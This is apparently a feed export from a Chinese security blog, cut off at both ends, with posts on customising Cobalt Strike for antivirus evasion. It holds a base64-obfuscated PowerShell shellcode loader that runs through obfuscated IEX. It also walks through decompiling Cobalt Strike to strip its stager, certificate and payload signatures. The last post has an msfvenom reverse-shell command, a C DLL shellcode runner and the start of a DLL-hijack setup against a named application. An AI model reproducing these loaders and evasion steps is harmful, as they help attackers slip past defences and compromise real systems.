class="string">&#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsNCglQYXJhbSAoJHZhcl9tb2R1bGUsICR2YXJfcHJvY2VkdXJlKQkJDQoJJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMgPSAoW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9KS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpDQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkNCglyZXR1cm4gJHZhcl9ncGEuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXShOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoKE5ldy1PYmplY3QgSW50UHRyKSwgKCR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykpLkludm9rZSgkbnVsbCwgQCgkdmFyX21vZHVsZSkpKSksICR2YXJfcHJvY2VkdXJlKSkNCn0NCg0KZnVuY3Rpb24gZnVuY19nZXRfZGVsZWdhdGVfdHlwZSB7DQoJUGFyYW0gKA0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsDQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0gW1R5cGVdICR2YXJfcmV0dXJuX3R5cGUgPSBbVm9pZF0NCgkpDQoNCgkkdmFyX3R5cGVfYnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykpLCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pDQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQ0KCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCg0KCXJldHVybiAkdmFyX3R5cGVfYnVpbGRlci5DcmVhdGVUeXBlKCkNCn0NCg0KW0J5dGVbXV0kdmFyX2NvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCc=&#x27;</span></span><br><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;%%TEST%%&#x27;</span></span><br><span class="line"><span class="variable">$x3</span>=<span class="string">&#x27;JykNCmZvciAoJHggPSAwOyAkeCAtbHQgJHZhcl9jb2RlLkNvdW50OyAkeCsrKSB7DQoJJHZhcl9jb2RlWyR4XSA9ICR2YXJfY29kZVskeF0gLWJ4b3IgMzUNCn0NCg0KJHZhcl92YSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChmdW5jX2dldF9wcm9jX2FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYyksIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkpKQ0KJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQ0KW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkdmFyX2NvZGUsIDAsICR2YXJfYnVmZmVyLCAkdmFyX2NvZGUubGVuZ3RoKQ0KDQokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkNCiR2YXJfcnVubWUuSW52b2tlKFtJbnRQdHJdOjpaZXJvKQ==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xx1</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x1</span>))</span><br><span class="line"><span class="variable">$xx2</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x2</span>))</span><br><span class="line"><span class="variable">$xx3</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x3</span>))</span><br><span class="line"><span class="variable">$xxx</span>=<span class="variable">$xx1</span>+<span class="variable">$xx2</span>+<span class="variable">$xx3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) IE`X <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xxx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">I`EX <span class="variable">$xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后把模板文件template.x86.ps1,编译文件ResourceUtils.class进行替换具体方法见上篇<br>替换完成后继续替换服务端和客户端的jar包<br>测试<br><img src="/posts/2f863dad/image-20220904151103899.png" alt="image-20220904151103899"><br>生成正常<br><img src="/posts/2f863dad/image-20220904151048614.png" alt="image-20220904151048614"><br>可以免杀火绒<br><img src="/posts/2f863dad/image-20220904151317564.png" alt="image-20220904151317564"><br>上线正常<br>这是修改32位的payload,64位的思路差不多</p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike简单二开学习记录(上)</title>
      <link href="/posts/ac2ce454/"/>
      <url>/posts/ac2ce454/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike简单二开学习记录-上"><a href="#CobaltStrike简单二开学习记录-上" class="headerlink" title="CobaltStrike简单二开学习记录(上)"></a>CobaltStrike简单二开学习记录(上)</h1><h2 id="环境搭建-CS反编译及导入IDEA编译"><a href="#环境搭建-CS反编译及导入IDEA编译" class="headerlink" title="环境搭建-CS反编译及导入IDEA编译"></a>环境搭建-CS反编译及导入IDEA编译</h2><blockquote><p>参考：<a href="https://github.com/zer0yu/Awesome-CobaltStrike">https://github.com/zer0yu/Awesome-CobaltStrike</a></p></blockquote><p>环境：IDEA JDK8&amp;11 </p><h3 id="1、反编译Jar包"><a href="#1、反编译Jar包" class="headerlink" title="1、反编译Jar包"></a>1、反编译Jar包</h3><p>利用IDEA自带反编译–不要用jd-gui</p><p>反编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar  org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true &lt;src.jar&gt; &lt;dest dir&gt;</span><br></pre></td></tr></table></figure><p>具体命令：coba文件夹需要自己创建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\JDK11\bin\java.exe&quot; -cp &quot;D:\IntelliJ IDEA\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar coba</span><br></pre></td></tr></table></figure><h3 id="2、新建Java项目"><a href="#2、新建Java项目" class="headerlink" title="2、新建Java项目"></a>2、新建Java项目</h3><p>完成后会在coba目录下生成一个cobaltstrike.jar文件<br>直接用解压缩文件进行解压<br>IDEA新建项目–项目目录下新建文件夹lib把原始的cobaltstrike.jar复制过去–再新建文件夹decompiled_src把刚才解压出来的文件放到该目录<br>项目配置:<br>第一步:文件–项目结构–模块–依赖–把lib目录下的cobaltstrike.jar添加进去–勾选然后确定<br>第二步:添加具有依赖项的模块–aggresss</p><p><img src="/posts/ac2ce454/image-20220902100035824.png" alt="image-20220902100035824"></p><p><img src="/posts/ac2ce454/image-20220902100527025.png" alt="image-20220902100527025"></p><p><img src="/posts/ac2ce454/image-20220902100458859.png" alt="image-20220902100458859"></p><h3 id="3、修改代码–测试"><a href="#3、修改代码–测试" class="headerlink" title="3、修改代码–测试"></a>3、修改代码–测试</h3><p>测试:将\decompiled_src\aggressor\Aggressor.java复制到\src\aggressor\Aggressor.java然后修改代码<br><img src="/posts/ac2ce454/image-20220902152720742.png" alt="image-20220902152720742"></p><p>插入代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JOptionPane.showMessageDialog(<span class="literal">null</span>,<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="4、打包编译"><a href="#4、打包编译" class="headerlink" title="4、打包编译"></a>4、打包编译</h3><p>编译代码:构建–构建工件–构建<br>构建完成生成\out\artifacts\CS_jar\CS.jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CS.jar</span><br></pre></td></tr></table></figure><p>成功弹窗<br><img src="/posts/ac2ce454/image-20220902152858456.png" alt="image-20220902152858456"></p><p>测试完成可以把src下的aggressor文件夹删掉了</p><h2 id="表面配置-对端口密码证书做特征消除"><a href="#表面配置-对端口密码证书做特征消除" class="headerlink" title="表面配置-对端口密码证书做特征消除"></a>表面配置-对端口密码证书做特征消除</h2><p>简单说下，较为简单，主要是源码的特征流量</p><ul><li><p>证书修改:cobaltstrike.beacon_keys和cobaltstrike.store不要使用默认的文件，删除</p></li><li><p>profile文件要换新的，启动服务端时记得加载，或直接把jar包里面的默认配置给改了</p></li><li><p>端口修改:开在公网的teamserver不要使用默认端口</p></li></ul><h2 id="逆向源码-对http-x2F-s上线流量做特征消除"><a href="#逆向源码-对http-x2F-s上线流量做特征消除" class="headerlink" title="逆向源码-对http&#x2F;s上线流量做特征消除"></a>逆向源码-对http&#x2F;s上线流量做特征消除</h2><p>CS生成一个http32位木马视图中开启web日志运行木马观察日志<br><img src="/posts/ac2ce454/image-20220902153858763.png" alt="image-20220902153858763"><br>发现访问了地址&#x2F;a7vN&#x2F; 再生成一个木马进行上线发现又变成了&#x2F;7lxA&#x2F;<br><img src="/posts/ac2ce454/image-20220902154139189.png" alt="image-20220902154139189"><br>该目录是根据一个checksum8算法来进行实现代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">checksum8</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        text = text.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; text.length(); x++) &#123;</span><br><span class="line">            sum += text.charAt(x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sum % <span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(checksum8(<span class="string">&quot;a7vN&quot;</span>));<span class="comment">//替换为访问的地址eg：a7vN</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次访问的地址通过代码运行的结果均为:92<br>可以得出结论:只要是符合「checksum8」算法技术出来的文件都可以请求到<br>这里理一下思路:cs采用http上线,在未修改的cs上面后面的http请求url为4位字符串同样算法checksum8得到为92或93可以判定为cs连接器<br>想要消除特征可以通过修改该数字来达到<br>checksum8函数位置:\decompiled_src\cloudstrike\WebServer.java</p><p><img src="/posts/ac2ce454/image-20220902192553334.png" alt="image-20220902192553334"><br>可以看到32位为92 64位数为93<br>接下来进行特征消除<br>按照上文的修改方法把\decompiled_src\cloudstrike\WebServer.java复制到\src\cloudstrike\WebServer.java<br>把访问的地址改为固定值比如64位改为为tests对应的数字为51 32位数改为test对应的数字为192<br>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isStager</span><span class="params">(String uri)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> checksum8(uri) == <span class="number">192L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isStagerX64</span><span class="params">(String uri)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> checksum8(uri) == <span class="number">51L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要修改判定代码\decompiled_src\common\CommonUtils.java复制到\src\common\CommonUtils.java<br>修改MSFURI和MSFURI_X64两个函数 将两个函数的返回值直接写死</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">MSFURI</span><span class="params">(<span class="type">int</span> var0)</span> &#123;</span><br><span class="line">   String[] var1 = toArray(<span class="string">&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;</span>);</span><br><span class="line"></span><br><span class="line">   StringBuffer var2;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">      var2 = <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(var0 + <span class="number">1</span>);</span><br><span class="line">      var2.append(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var0; ++var3) &#123;</span><br><span class="line">         var2.append(pick(var1));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span>(checksum8(var2.toString()) != <span class="number">92L</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">MSFURI_X64</span><span class="params">()</span> &#123;</span><br><span class="line">   String[] var0 = toArray(<span class="string">&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;</span>);</span><br><span class="line"></span><br><span class="line">   String var1;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">      var1 = <span class="string">&quot;/&quot;</span> + pick(var0) + pick(var0) + pick(var0) + pick(var0);</span><br><span class="line">   &#125; <span class="keyword">while</span>(checksum8(var1) != <span class="number">93L</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;tests&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来按照上文构建代码<br>产生三个报错<br><img src="/posts/ac2ce454/image-20220902200423883.png" alt="image-20220902200423883"><br>第一个报错–删掉int len$;<br>第二个报错–删掉String[]<br>第三个报错–删掉WebService service;<br>重新构建<br>将构建好的jar替换掉原包<br>或者<br>把修改的两个文件重新编译下:CommonUtils.java WebServer.java 构建–重新编译<br>把原包cobaltstrike.jar用解压缩文件打开两个文件编译好的class文件替换掉原有的class文件<br>两种方法那个可以成功就用那个 重点:客户端和服务端都要替换<br><img src="/posts/ac2ce454/image-20220902213022132.png" alt="image-20220902213022132"><br>地址成功修改为了test</p><h2 id="逆向源码-对http-x2F-s生成Payload做特征消除"><a href="#逆向源码-对http-x2F-s生成Payload做特征消除" class="headerlink" title="逆向源码-对http&#x2F;s生成Payload做特征消除"></a>逆向源码-对http&#x2F;s生成Payload做特征消除</h2><p>payload生成方式:<br>32位:BeaconHTTPStagerX86-&gt;GenericHTTPStagerX86-&gt;resources&#x2F;httpstager.bin<br>64位:BeaconHTTPStagerX86-&gt;GenericHTTPStagerX64-&gt;resources&#x2F;httpstager64.bin<br>思路:<br>用x86资源bin替换x64的，实现x64生成与x86一致 直接把httpstager.bin文件复制出来重命名为httpstager64.bin然后替换原来的httpstager64.bin<br>注意这里仅替换还不行因为资源文件改变读取方法也要改变还要更改代码GenericHTTPStagerX64.java代码改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">GenericHTTPStagerX86</span> <span class="keyword">extends</span> <span class="title class_">GenericHTTPStager</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">GenericHTTPStagerX86</span><span class="params">(ScListener var1)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>(var1);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getExitOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">708</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPortOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">191</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSkipOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">736</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getFlagsOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">211</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">arch</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;x64&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getStagerFile</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;resources/httpstager64.bin&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后重新编译方法与上文相同<br>大体思路:1、替换1n生即免杀  2、更改源码生成机制即晚杀</p><h2 id="逆向源码-对Powershell生成Payload做特征消除"><a href="#逆向源码-对Powershell生成Payload做特征消除" class="headerlink" title="逆向源码-对Powershell生成Payload做特征消除"></a>逆向源码-对Powershell生成Payload做特征消除</h2><p>CS生成的powershell shellcode都是通过模板生成免杀效果几乎为0<br>通过修改模板消除特征同时提高免杀效果<br>\decompiled_src\resources\template.x86.ps1即为32位shellcode模板文件可以看到shellcode通过<code>%%DATA%%</code>进行传递而<code>%%DATA%%</code>在\decompiled_src\common\ResourceUtils.java中的<code>_buildPowerShellNoHint</code>函数生成<br>到这里shellcode的生成逻辑也就知道了<br>可以通过修改生成逻辑–比如修改_buildPowerShellNoHint中的加密方式 </p><p>这需要很强的开发功底如果开发能力不强可以直接将免杀shellcode替换掉template.x86.ps1达到生成即免杀</p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL劫持与Syscall免杀初尝试</title>
      <link href="/posts/facab1e5/"/>
      <url>/posts/facab1e5/</url>
      
        <content type="html"><![CDATA[<h1 id="DLL劫持与Syscall免杀初尝试"><a href="#DLL劫持与Syscall免杀初尝试" class="headerlink" title="DLL劫持与Syscall免杀初尝试"></a>DLL劫持与Syscall免杀初尝试</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="DLL劫持-语言-调用加载"><a href="#DLL劫持-语言-调用加载" class="headerlink" title="DLL劫持-语言-调用加载"></a>DLL劫持-语言-调用加载</h3><p>利用msf生产payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c</span><br></pre></td></tr></table></figure><p>Visual Studio创建动态链接库(DLL)项目</p><p><img src="/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png" alt="image-20220828230121536"></p><p>项目生成的dllmain.cpp,pch.cpp重命名为dllmain.c,pch.c </p><p><img src="/posts/facab1e5/image-20220828231531280.png" alt="image-20220828231531280"></p><p>dllmain.c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="comment">//msf生产payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择release生成解决方案<br>利用python调用dll文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#利用python载入dll文件</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;Dll1&#x27;</span>)</span><br><span class="line"><span class="comment">#调用dll文件内置方法函数</span></span><br><span class="line">lib.main()</span><br></pre></td></tr></table></figure><p>运行上线</p><h3 id="DLL劫持-白加黑-导入加载"><a href="#DLL劫持-白加黑-导入加载" class="headerlink" title="DLL劫持-白加黑-导入加载"></a>DLL劫持-白加黑-导入加载</h3><p>这里以kk录像机为例</p><p>启动kk录像机使用火绒剑进行分析</p><p><img src="/posts/facab1e5/image-20220829082438124.png" alt="image-20220829082438124"></p><p>可以看到kk录像机加载的dll文件,我们可以选择一个dll文件来进行劫持,尽量找文件较小的dll文件<br>这里选择libfontconfig-1.dll<br>接下来该构造一个dll了<br>和上文相同新建一个dll项目这次不用改后缀了<br>代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 